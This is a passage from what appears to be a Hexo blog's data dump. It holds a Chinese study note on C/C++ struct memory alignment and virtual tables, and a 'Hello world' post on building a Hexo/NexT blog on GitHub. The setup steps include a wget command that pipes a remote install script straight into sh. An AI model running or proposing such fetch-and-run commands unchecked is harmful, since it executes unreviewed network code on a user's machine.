由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．\"></a>7. 由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．</h4><p><img src=\"/images/gcc-st-7.png\" alt=\"st_to_aligned(1)\"></p>\n<h3 id=\"5-C-中的高级之处\"><a href=\"#5-C-中的高级之处\" class=\"headerlink\" title=\"5. C++中的高级之处\"></a>5. C++中的高级之处</h3><blockquote>\n<p>至于C和C++的区别我就不再重复教科书上的内容．只是觉得作为一个developer可能只会关心功能实现，不会管各种机制的内部实现，反正丢给编译器去翻译和安排就是咯，咱又不是研究者．但是一旦出现bug且需要调试器支持的时候，底层的实现就不得不去啃了．编译器也是人开发出来的，当然也少不了出问题，只是现代开发体系为了降低开发难度因此对计算机的<strong>封装</strong>程度已经快到了<code>说话编程</code>的地步了．重复造轮子有必要吗？珍爱生命，快用py？  </p>\n</blockquote>\n<h4 id=\"1-C-中的结构体和类的区别？\"><a href=\"#1-C-中的结构体和类的区别？\" class=\"headerlink\" title=\"1.C++中的结构体和类的区别？\"></a>1.C++中的结构体和类的区别？</h4><p>根据C++的标准它俩的区别应该只是默认的访问权限的不同，其他该有的编译器(比如构造函数，析构函数等)还是会允许程序员实现的．以前在微博上分析过一道题<a href=\"http://weibo.com/p/230418e682a92a0102w5wl?mod=zwenzhang\" target=\"_blank\" rel=\"external\">链接</a>.因此，在C++中，为了让编译器能够根据标准对各种权限进行检查并生成程序员想要的代码，还是用class比较好．我们不能单调地看待private声明或者const的成员，认为它是不可能被子类或者其他非正常手段修改的．要知道我们所谓的编程最主要是根据标准和规则对编译器进行交互，让编译器取帮我们做翻译工作，一旦编译器通过，程序被加载到内存中后一切的一切被视为<code>高低电平</code>或者其他二进制信息，到时候让CPU译码之后想怎么干就怎么干~_~(当然这是intel 8086时代，从286开始就开始了保护模式).</p>\n<h4 id=\"2-C-中class的虚函数\"><a href=\"#2-C-中class的虚函数\" class=\"headerlink\" title=\"2. C++中class的虚函数\"></a>2. C++中class的虚函数</h4><p>C++中的虚函数机制保证了动态绑定，实现了直到程序执行的时候才选择执行哪个代码．一般编译器的实现是在对象空间(类被实例化后)开始的4字节(32位OS)保存一个虚函数表指针，继承了几个类中的虚函数，一般就会产生几个虚函数表指针，再加上数据成员(除去静态成员),这个对象的大小大概就是这么多了．类的方法并不单独属于对象，每一次调用方法的时候必须要传入this指针，其实就是这个对象的首地址．在VC++中一般采用intel 的ecx寄存器作为this指针的载体．例如(<code>obj.func(a, b, c);</code>)在编译器翻译的汇编代码里面等价于(<code>func(&amp;obj, a, b, c);</code>),某些编译器甚至允许这样调用．因为底层的汇编代码一样啊….</p>\n<hr>\n<p>先总结这么多吧，其实想真正弄清楚的话还需亲自实现或者读懂一个编译器，不仅仅考虑编译原理里面的词语法分析等，而更要从硬件层面取理解各种软件设计思维模式．毕竟软件是跑在硬件这个载体上面的，各种效率问题要经得起推敲的，为啥选择了GNU/Linux呢？可不仅仅因为是开源免费的原因吧~_~</p>\n","excerpt":"","more":"<h2 id=\"关于C-C-中结构体-类-内存对齐问题\"><a href=\"#关于C-C-中结构体-类-内存对齐问题\" class=\"headerlink\" title=\"关于C/C++中结构体(类)内存对齐问题\"></a>关于C/C++中结构体(类)内存对齐问题</h2><hr>\n<blockquote>\n<p>各种笔试面试都会涉及的问题，具体的可以查阅相关标准(如C99,C11等)或者翻阅国外知名论坛<a href=\"http://stackoverflow.com/\" title=\"Stack Overflow\">stackoverflow</a>等寻找相关资料进一步分析，我个人的一些总结如下，如有不对之处，还请诸位不吝赐教．</p>\n</blockquote>\n<hr>\n<p>可参考资料：<br><a href=\"https://en.wikipedia.org/wiki/Data_structure_alignment#Problems\" title=\"维基百科\">维基百科</a><br><a href=\"http://stackoverflow.com/questions/2554229/memory-alignment-within-gcc-structs\">StackOverflow GCC Structure</a><br><a href=\"https://gcc.gnu.org/onlinedocs/gcc/Type-Attributes.html\">GCC文档</a></p>\n<h3 id=\"1-首先放出现代PC编译器在实现的时候对于字长的一些典型约定\"><a href=\"#1-首先放出现代PC编译器在实现的时候对于字长的一些典型约定\" class=\"headerlink\" title=\"1. 首先放出现代PC编译器在实现的时候对于字长的一些典型约定:\"></a>1. 首先放出现代PC编译器在实现的时候对于字长的一些典型约定:</h3><h4 id=\"32位编译器：\"><a href=\"#32位编译器：\" class=\"headerlink\" title=\"32位编译器：\"></a>32位编译器：</h4><pre><code>char ：1个字节\nchar*（即指针变量）: 4个字节（32位的寻址空间是2^32, 即32个bit，也就是4个字节。同理64位编译器）\nshort int : 2个字节\nint：  4个字节\nunsigned int : 4个字节\nfloat:  4个字节\ndouble:   8个字节\nlong:   4个字节\nlong long:  8个字节\nunsigned long:  4个字节\n</code></pre><h4 id=\"64位编译器：\"><a href=\"#64位编译器：\" class=\"headerlink\" title=\"64位编译器：\"></a>64位编译器：</h4><pre><code>char ：1个字节\nchar* (即指针变量): 8个字节\nshort int : 2个字节\nint：  4个字节\nunsigned int : 4个字节\nfloat:  4个字节\ndouble:   8个字节\nlong:   8个字节\nlong long:  8个字节\nunsigned long:  8个字节  \n</code></pre><p>其中特别需要说明的一点就是指针类型的，任何类型的指针字长(当然包括结构体和类等复合类型)几乎应该只与编译器平台或者说是处理器地址总线长度有关(当然类似8086这种16位的处理器20根地址线的CPU等就另当别论了).关于这一点我认为学过体系结构和组成原理的同学应该会有深刻体会(我们组成原理课有实验就是按照教程实现一个简单的CPU)．在C语言中直接使用操作符sizeof(type)就可以得到字节大小，注意这个sizeof不是一个函数而是一个操作符．操作符的话表明结果已经在编译的时候确定了，而函数的话如果编译器不进行优化则等到运行时被调用才会返回值．关于这一点sizeof在有数组的参数中会发生一些奇妙的事情．</p>\n<hr>\n<h3 id=\"2-变量排放规则-自己的见解\"><a href=\"#2-变量排放规则-自己的见解\" class=\"headerlink\" title=\"2. 变量排放规则(自己的见解)\"></a>2. 变量排放规则(自己的见解)</h3><h4 id=\"1-内置类型对象-如char、int-lt-现代PC编译器普遍为4字节-gt-等-的对齐起始地址为其本身大小和编译器默认大小（或用-pragma-pack（n-指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1-2-4-8等2的幂值）中最小的一个的整数倍\"><a href=\"#1-内置类型对象-如char、int-lt-现代PC编译器普遍为4字节-gt-等-的对齐起始地址为其本身大小和编译器默认大小（或用-pragma-pack（n-指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1-2-4-8等2的幂值）中最小的一个的整数倍\" class=\"headerlink\" title=\"1. 内置类型对象(如char、int&lt;现代PC编译器普遍为4字节&gt;等)的对齐起始地址为其本身大小和编译器默认大小（或用#pragma pack（n)指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1,2,4,8等2的幂值）中最小的一个的整数倍.\"></a>1. 内置类型对象(如char<1字节>、int&lt;现代PC编译器普遍为4字节&gt;等)的<strong>对齐起始地址</strong>为其本身大小和编译器默认大小（或用#pragma pack（n)指定的n，一般编译器默认为8字节，可用菜单等命令修改，n一般为1,2,4,8等2的幂值）中最小的一个的整数倍.</h4><h4 id=\"2-整个结构体或者类的大小为它们中的内置类型大小最大的那一个和编译器默认大小（或用-pragma-pack-n-指定的n中两者较小的那个的整数倍-而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。\"><a href=\"#2-整个结构体或者类的大小为它们中的内置类型大小最大的那一个和编译器默认大小（或用-pragma-pack-n-指定的n中两者较小的那个的整数倍-而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。\" class=\"headerlink\" title=\"2. 整个结构体或者类的大小为它们中的内置类型大小最大的那一个和编译器默认大小（或用#pragma pack (n)指定的n中两者较小的那个的整数倍,而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。\"></a>2. 整个结构体或者类的<strong>大小</strong>为它们中的内置类型大小最大的那一个和编译器默认大小（或用#pragma pack (n)指定的n中两者较小的那个的整数倍,而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。</h4><blockquote>\n<p>可能听起来很拗口，但是一旦把握了准则在应对这些问题的时候就很轻而易举了．其实主要是两个点，一个是变量放的偏移地址，另一个是复杂类型的总的大小．首先我们要知道为什么编译器需要对变量进行内存对齐？知道内存组织的童鞋可能有些感触，我们的代码运行的时候必须首先从磁盘(或其他非易失性介质)通过外部总线加载到内存中，然后再跳转到相应处运行．基于现有的计算机运行机制不断地进行<strong>取指，译码，执行等</strong>操作，由于内存本身的半导体的物理特性使得内存并不是一次性有几个G那么多而是通过很小的介质(一般是8位)不断地”串并联”起来的，一般能够保证一个地址能够寻址一个字节的数据，其实是半导体的导通与截止表示的计算机中的”1”和”0”．打个比方，如果地址不是偶数的，要取偶数个的数据的话，CPU在硬件上可能要多花几个时钟周期来进行取数据和整合，才能保证数据不出错．因此很多算法也都是以空间换时间的思想来加快计算．还有就是在嵌入式领域，由于板子或者芯片本身的内存资源非常有限，必须要求嵌入式程序员写出几乎<code>磕碜</code>的代码才能保证运行流畅等．因此，至少在不怎么缺内存的PC或者Server领域，为了加快计算，还是可以采用编译器进行的优化的．(可能还有其他技术比如缓存啥的我们先不讨论)</p>\n</blockquote>\n<h3 id=\"3-Win栗子如下：\"><a href=\"#3-Win栗子如下：\" class=\"headerlink\" title=\"3. Win栗子如下：\"></a>3. Win栗子如下：</h3><h4 id=\"1-这是以前我用Win的时候VC-6-0编译器的效果图\"><a href=\"#1-这是以前我用Win的时候VC-6-0编译器的效果图\" class=\"headerlink\" title=\"1. 这是以前我用Win的时候VC++ 6.0编译器的效果图\"></a>1. 这是以前我用Win的时候VC++ 6.0编译器的效果图</h4><p><img src=\"/images/1.png\" alt=\"配置\"></p>\n<h4 id=\"2-此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的\"><a href=\"#2-此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的\" class=\"headerlink\" title=\"2. 此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的\"></a>2. 此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的</h4><p><img src=\"/images/2.png\" alt=\"int b\"></p>\n<h4 id=\"3-下面这一处说明大小是按照int类型-最大呀-的整数倍来取\"><a href=\"#3-下面这一处说明大小是按照int类型-最大呀-的整数倍来取\" class=\"headerlink\" title=\"3. 下面这一处说明大小是按照int类型(最大呀)的整数倍来取\"></a>3. 下面这一处说明大小是按照int类型(最大呀)的整数倍来取</h4><p><img src=\"/images/3.png\" alt=\"整数倍\"></p>\n<h4 id=\"4-说明当类型为数组的时候，只按照它的类型来对齐而非整个大小\"><a href=\"#4-说明当类型为数组的时候，只按照它的类型来对齐而非整个大小\" class=\"headerlink\" title=\"4. 说明当类型为数组的时候，只按照它的类型来对齐而非整个大小\"></a>4. 说明当类型为数组的时候，只按照它的类型来对齐而非整个大小</h4><p><img src=\"/images/4.png\" alt=\"数组\"></p>\n<h4 id=\"5-说明第二个元素char类型的可以在任何偏移处安放-因为它是一个字节啊\"><a href=\"#5-说明第二个元素char类型的可以在任何偏移处安放-因为它是一个字节啊\" class=\"headerlink\" title=\"5. 说明第二个元素char类型的可以在任何偏移处安放(因为它是一个字节啊)\"></a>5. 说明第二个元素char类型的可以在任何偏移处安放(因为它是一个字节啊)</h4><p><img src=\"/images/5.png\" alt=\"char\"></p>\n<h4 id=\"6-说明-pragma-pack-n-n非2的幂的值时候无效\"><a href=\"#6-说明-pragma-pack-n-n非2的幂的值时候无效\" class=\"headerlink\" title=\"6. 说明#pragma pack (n) n非2的幂的值时候无效\"></a>6. 说明#pragma pack (n) n非2的幂的值时候无效</h4><p><img src=\"/images/6.png\" alt=\"#pragma pack (n)\"></p>\n<h4 id=\"7-说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数\"><a href=\"#7-说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数\" class=\"headerlink\" title=\"7. 说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数\"></a>7. 说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数</h4><p><img src=\"/images/7.png\" alt=\"struct\"></p>\n<h4 id=\"8-说明pragma-pack-3-没作用\"><a href=\"#8-说明pragma-pack-3-没作用\" class=\"headerlink\" title=\"8. 说明pragma pack (3)没作用\"></a>8. 说明pragma pack (3)没作用</h4><p><img src=\"/images/8.png\" alt=\"pack (3)\"></p>\n<h3 id=\"4-Linux栗子如下-据说gcc默认是4-bytes的对齐大小-：\"><a href=\"#4-Linux栗子如下-据说gcc默认是4-bytes的对齐大小-：\" class=\"headerlink\" title=\"4. Linux栗子如下(据说gcc默认是4 bytes的对齐大小)：\"></a>4. Linux栗子如下(据说gcc默认是4 bytes的对齐大小)：</h3><h4 id=\"1-这是我用ubuntu-16-04-amd64-ssh连接ubuntu-16-04-i386之后gcc版本号\"><a href=\"#1-这是我用ubuntu-16-04-amd64-ssh连接ubuntu-16-04-i386之后gcc版本号\" class=\"headerlink\" title=\"1. 这是我用ubuntu 16.04 amd64 ssh连接ubuntu 16.04 i386之后gcc版本号:\"></a>1. 这是我用ubuntu 16.04 amd64 ssh连接ubuntu 16.04 i386之后gcc版本号:</h4><p><img src=\"/images/gcc-st-1.png\" alt=\"gcc -v\"></p>\n<h4 id=\"2-这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节\"><a href=\"#2-这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节\" class=\"headerlink\" title=\"2. 这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节\"></a>2. 这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节</h4><p><img src=\"/images/gcc-st-2.png\" alt=\"4 butys\"></p>\n<h4 id=\"3-在gcc中加入功能和pragma-pack差不多的attribute选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…\"><a href=\"#3-在gcc中加入功能和pragma-pack差不多的attribute选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…\" class=\"headerlink\" title=\"3. 在gcc中加入功能和pragma pack差不多的attribute选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…\"></a>3. 在gcc中加入功能和pragma pack差不多的<strong>attribute</strong>选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…</h4><p><img src=\"/images/gcc-st-3.png\" alt=\"attri_1\"></p>\n<h4 id=\"4-在这里只是a之后的那一个字节是填充的-short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，attribute干得好事\"><a href=\"#4-在这里只是a之后的那一个字节是填充的-short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，attribute干得好事\" class=\"headerlink\" title=\"4. 在这里只是a之后的那一个字节是填充的,short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，attribute干得好事~\"></a>4. 在这里只是a之后的那一个字节是填充的,short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，<strong>attribute</strong>干得好事~</h4><p><img src=\"/images/gcc-st-4.png\" alt=\"attri_2\"></p>\n<h4 id=\"5-证明了有pack为1的地方必定不留一点空隙\"><a href=\"#5-证明了有pack为1的地方必定不留一点空隙\" class=\"headerlink\" title=\"5. 证明了有pack为1的地方必定不留一点空隙~~~\"></a>5. 证明了有pack为1的地方必定不留一点空隙~~~</h4><p><img src=\"/images/gcc-st-5.png\" alt=\"pack_1\"></p>\n<h4 id=\"6-第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢-应该是它自己作为结构体的时候元素中最大的-这个栗子为double-要是有char-类型数组超过8，不用管，认为是char-和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．\"><a href=\"#6-第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢-应该是它自己作为结构体的时候元素中最大的-这个栗子为double-要是有char-类型数组超过8，不用管，认为是char-和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．\" class=\"headerlink\" title=\"6. 第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢?应该是它自己作为结构体的时候元素中最大的(这个栗子为double,要是有char 类型数组超过8，不用管，认为是char)和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．\"></a>6. 第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢?应该是它自己作为结构体的时候元素中最大的(这个栗子为double,要是有char 类型数组超过8，不用管，认为是char)和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．</h4><p><img src=\"/images/gcc-st-6.png\" alt=\"st_to_st\"></p>\n<h4 id=\"7-由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．\"><a href=\"#7-由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．\" class=\"headerlink\" title=\"7. 由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．\"></a>7. 由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．</h4><p><img src=\"/images/gcc-st-7.png\" alt=\"st_to_aligned(1)\"></p>\n<h3 id=\"5-C-中的高级之处\"><a href=\"#5-C-中的高级之处\" class=\"headerlink\" title=\"5. C++中的高级之处\"></a>5. C++中的高级之处</h3><blockquote>\n<p>至于C和C++的区别我就不再重复教科书上的内容．只是觉得作为一个developer可能只会关心功能实现，不会管各种机制的内部实现，反正丢给编译器去翻译和安排就是咯，咱又不是研究者．但是一旦出现bug且需要调试器支持的时候，底层的实现就不得不去啃了．编译器也是人开发出来的，当然也少不了出问题，只是现代开发体系为了降低开发难度因此对计算机的<strong>封装</strong>程度已经快到了<code>说话编程</code>的地步了．重复造轮子有必要吗？珍爱生命，快用py？  </p>\n</blockquote>\n<h4 id=\"1-C-中的结构体和类的区别？\"><a href=\"#1-C-中的结构体和类的区别？\" class=\"headerlink\" title=\"1.C++中的结构体和类的区别？\"></a>1.C++中的结构体和类的区别？</h4><p>根据C++的标准它俩的区别应该只是默认的访问权限的不同，其他该有的编译器(比如构造函数，析构函数等)还是会允许程序员实现的．以前在微博上分析过一道题<a href=\"http://weibo.com/p/230418e682a92a0102w5wl?mod=zwenzhang\">链接</a>.因此，在C++中，为了让编译器能够根据标准对各种权限进行检查并生成程序员想要的代码，还是用class比较好．我们不能单调地看待private声明或者const的成员，认为它是不可能被子类或者其他非正常手段修改的．要知道我们所谓的编程最主要是根据标准和规则对编译器进行交互，让编译器取帮我们做翻译工作，一旦编译器通过，程序被加载到内存中后一切的一切被视为<code>高低电平</code>或者其他二进制信息，到时候让CPU译码之后想怎么干就怎么干~_~(当然这是intel 8086时代，从286开始就开始了保护模式).</p>\n<h4 id=\"2-C-中class的虚函数\"><a href=\"#2-C-中class的虚函数\" class=\"headerlink\" title=\"2. C++中class的虚函数\"></a>2. C++中class的虚函数</h4><p>C++中的虚函数机制保证了动态绑定，实现了直到程序执行的时候才选择执行哪个代码．一般编译器的实现是在对象空间(类被实例化后)开始的4字节(32位OS)保存一个虚函数表指针，继承了几个类中的虚函数，一般就会产生几个虚函数表指针，再加上数据成员(除去静态成员),这个对象的大小大概就是这么多了．类的方法并不单独属于对象，每一次调用方法的时候必须要传入this指针，其实就是这个对象的首地址．在VC++中一般采用intel 的ecx寄存器作为this指针的载体．例如(<code>obj.func(a, b, c);</code>)在编译器翻译的汇编代码里面等价于(<code>func(&amp;obj, a, b, c);</code>),某些编译器甚至允许这样调用．因为底层的汇编代码一样啊….</p>\n<hr>\n<p>先总结这么多吧，其实想真正弄清楚的话还需亲自实现或者读懂一个编译器，不仅仅考虑编译原理里面的词语法分析等，而更要从硬件层面取理解各种软件设计思维模式．毕竟软件是跑在硬件这个载体上面的，各种效率问题要经得起推敲的，为啥选择了GNU/Linux呢？可不仅仅因为是开源免费的原因吧~_~</p>\n"},{"title":"Hello world","date":"2016-08-16T07:10:22.000Z","_content":"\nHexo and NexT on Github 建博客折腾...\n==============\n\n---\n**参考资料**  \n1. [Hexo.io原装教程:https://hexo.io/zh-cn/docs/](https://hexo.io/zh-cn/docs/ \"Hexo官网\")  \n2. [Next主题配置:http://theme-next.iissnan.com/theme-settings.html](http://theme-next.iissnan.com/theme-settings.html \"Next主题\")  \n3. [不如的教程，很是详细:http://ibruce.info/2013/11/22/hexo-your-blog/](http://ibruce.info/2013/11/22/hexo-your-blog/ \"不如的博客\")  \n4. [bubukoo:http://bubkoo.com/2013/12/16/hexo-issure/](http://bubkoo.com/2013/12/16/hexo-issure/ \"tags..\")  \n5. [新增tags等:http://www.cnblogs.com/debugzer0/articles/5461804.html](http://www.cnblogs.com/debugzer0/articles/5461804.html)  \n\n---\n\n#### 1. 装环境(详情参考官网教程,此处简述，至少github环境安装从略~_~Windows的有点坑)  \n\n\n**安装Node.js**  \n\tWget:  \n\t`$ wget -qO- https://raw.github.com/creationix/nvm/master/install.sh | sh`  \n\t安装完成后，重启终端并执行一下命令：  \n\t`$ nvm install stable`  \n**安装Hexo**  \n\t`$ npm install hexo-cli -g　　#装hexo`   \n**初始化项目并开启服务**(在github上建立一个名为username.github.io(或者com)项目，并在本地仓库进行绑定)\n```  \n\t$ hexo init username.github.com　#此处应保证项目(username替换成你的名字)目录已被git remote add等操作过即已经绑定github项目,如果不绑定也能用即可忽略  \n\t$ cd username.github.com　　　　　　#切换到工作目录   \n\t$ npm install　　　　#npm加载,从远程端加载默认配置文件到本地  \n\t$ hexo g　　　#生成相应的文件和文档,每次更改之后都要键入这行命令，或者直接键入hexo g -d就可生成并上传  \n\t$ hexo s 　　　#开启服务监听，即在本地可以访问，默认是http://localhost:4000,每次可以先在本地浏览无误后上传至github  \n\t$ hexo d　　　#上传至github,可以在浏览器键入username.github.io二级域名进行访问，在此之前需要配置好_config.yml文件  \n```  \n#### 2. 配置  \n`按照教程更改相应参数即可，若上述命令中遇到有错误，可直接google或者按照错误打印出来的网址进行访问即可得到解决方案,下图是我的github配置,某些情况下可能需要改成使用https,但是仍然可以不必每次都输入账户名和密码`   \n![github配置](/images/git.png)\n#### 3. 选择主题  \n`我觉得加载一个好的主题对一个博客还是很重要的，所以我找了很久，官方放出来的链接在这里`[https://hexo.io/themes/index.html](https://hexo.io/themes/index.html \"theme\"),`慢慢寻找吧，几乎都是开源可用的，有一些需要一些前端方面的知识．建议选择Next．pacman等经典的主题，即简单又美观.  `  \n#### 4. 编辑和发布  \n`参考前文教程装好所有的插件(评论系统，统计，打赏系统等)之后就可以自己写文章发布了，在这里注意完成菜单下的各个类别的目录的创建．比如`**hexo new page \"tags\"**`等，否则会导致访问失败．参考快速写文章的命令以及生成和发布命令可以使得写作是一种享受哦．一起来用MarkDown写博客吧.`  \n","source":"_posts/Hello-world.md","raw":"---\ntitle: Hello world\ndate: 2016-08-16 15:10:22\ncategories:\n- study\ntags:\n- Configure\n---\n\nHexo and NexT on Github 建博客折腾...\n==============\n\n---\n**参考资料**  \n1. [Hexo.io原装教程:https://hexo.io/zh-cn/docs/](https://hexo.io/zh-cn/docs/ \"Hexo官网\")  \n2. [Next主题配置:http://theme-next.iissnan.com/theme-settings.html](http://theme-next.iissnan.com/theme-settings.html \"Next主题\")  \n3. [不如的教程，很是详细:http://ibruce.info/2013/11/22/hexo-your-blog/](http://ibruce.info/2013/11/22/hexo-your-blog/ \"不如的博客\")  \n4. [bubukoo:http://bubkoo.com/2013/12/16/hexo-issure/](http://bubkoo.com/2013/12/16/hexo-issure/ \"tags..\")  \n5. [新增tags等:http://www.cnblogs.com/debugzer0/articles/5461804.html](http://www.cnblogs.com/debugzer0/articles/5461804.html)  \n\n---\n\n#### 1. 装环境(详情参考官网教程,此处简述，至少github环境安装从略~_~Windows的有点坑)  \n\n\n**安装Node.js**  \n\tWget:  \n\t`$ wget -qO- https://raw.github.com/creationix/nvm/master/install.sh | sh`  \n\t安装完成后，重启终端并执行一下命令：  \n\t`$ nvm install stable`  \n**安装Hexo**  \n\t`$ npm install hexo-cli -g　　#装hexo`   \n**初始化项目并开启服务**(在github上建立一个名为username.github.io(或者com)项目，并在本地仓库进行绑定)\n```  \n\t$ hexo init username.github.com　#此处应保证项目(username替换成你的名字)目录已被git remote add等操作过即已经绑定github项目,如果不绑定也能用即可忽略  \n\t$ cd username.github.com　　　　　　#切换到工作目录   \n\t$ npm install　　　　#npm加载,从远程端加载默认配置文件到本地  \n\t$ hexo g　　　#生成相应的文件和文档,每次更改之后都要键入这行命令，或者直接键入hexo g -d就可生成并上传  \n\t$ hexo s 　　　#开启服务监听，即在本地可以访问，默认是http://localhost:4000,每次可以先在本地浏览无误后上传至github  \n\t$ hexo d　　　#上传至github,可以在浏览器键入username.github.io二级域名进行访问，在此之前需要配置好_config.yml文件  \n```  \n#### 2. 配置  \n`按照教程更改相应参数即可，若上述命令中遇到有错误，可直接google或者按照错误打印出来的网址进行访问即可得到解决方案,下图是我的github配置,某些情况下可能需要改成使用https,但是仍然可以不必每次都输入账户名和密码`   \n![github配置](/images/git.png)\n#### 3. 选择主题  \n`我觉得加载一个好的主题对一个博客还是很重要的，所以我找了很久，官方放出来的链接在这里`[https://hexo.io/themes/index.html](https://hexo.io/themes/index.html \"theme\"),`慢慢寻找吧，几乎都是开源可用的，有一些需要一些前端方面的知识．建议选择Next．pacman等经典的主题，即简单又美观.  `  \n#### 4. 编辑和发布  \n`参考前文教程装好所有的插件(评论系统，统计，打赏系统等)之后就可以自己写文章发布了，在这里注意完成菜单下的各个类别的目录的创建．比如`**hexo new page \"tags\"**`等，否则会导致访问失败．参考快速写文章的命令以及生成和发布命令可以使得写作是一种享受哦．一起来用MarkDown写博客吧.`  \n","slug":"Hello-world","published":1,"updated":"2016-11-03T08:38:47.227Z","_id":"ciuteb7ox0006r1m1iopz5gde","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Hexo-and-NexT-on-Github-建博客折腾…\"><a href=\"#Hexo-and-NexT-on-Github-建博客折腾…\" class=\"headerlink\" title=\"Hexo and NexT on Github 建博客折腾…\"></a>Hexo and NexT on Github 建博客折腾…</h1><hr>\n<p><strong>参考资料</strong>  </p>\n<ol>\n<li><a href=\"https://hexo.io/zh-cn/docs/\" title=\"Hexo官网\" target=\"_blank\" rel=\"external\">Hexo.io原装教程:https://hexo.io/zh-cn/docs/</a>  </li>\n<li><a href=\"http://theme-next.iissnan.com/theme-settings.html\" title=\"Next主题\" target=\"_blank\" rel=\"external\">Next主题配置:http://theme-next.iissnan.com/theme-settings.html</a>  </li>\n<li><a href=\"http://ibruce.info/2013/11/22/hexo-your-blog/\" title=\"不如的博客\" target=\"_blank\" rel=\"external\">不如的教程，很是详细:http://ibruce.info/2013/11/22/hexo-your-blog/</a>  </li>\n<li><a href=\"http://bubkoo.com/2013/12/16/hexo-issure/\" title=\"tags..\" target=\"_blank\" rel=\"external\">bubukoo:http://bubkoo.com/2013/12/16/hexo-issure/</a>  </li>\n<li><a href=\"http://www.cnblogs.com/debugzer0/articles/5461804.html\" target=\"_blank\" rel=\"external\">新增tags等:http://www.cnblogs.com/debugzer0/articles/5461804.html</a>  </li>\n</ol>\n<hr>\n<h4 id=\"1-装环境-详情参考官网教程-此处简述，至少github环境安装从略-Windows的有点坑\"><a href=\"#1-装环境-详情参考官网教程-此处简述，至少github环境安装从略-Windows的有点坑\" class=\"headerlink\" title=\"1. 装环境(详情参考官网教程,此处简述，至少github环境安装从略~_~Windows的有点坑)\"></a>1. 装环境(详情参考官网教程,此处简述，至少github环境安装从略~_~Windows的有点坑)</h4><p><strong>安装Node.js</strong><br>    Wget:<br>    <code>$ wget -qO- https://raw.github.com/creationix/nvm/master/install.sh | sh</code><br>    安装完成后，重启终端并执行一下命令：<br>    <code>$ nvm install stable</code><br><strong>安装Hexo</strong><br>    <code>$ npm install hexo-cli -g　　#装hexo</code><br><strong>初始化项目并开启服务</strong>(在github上建立一个名为username.github.io(或者com)项目，并在本地仓库进行绑定)</p>\n<pre><code>$ hexo init username.github.com　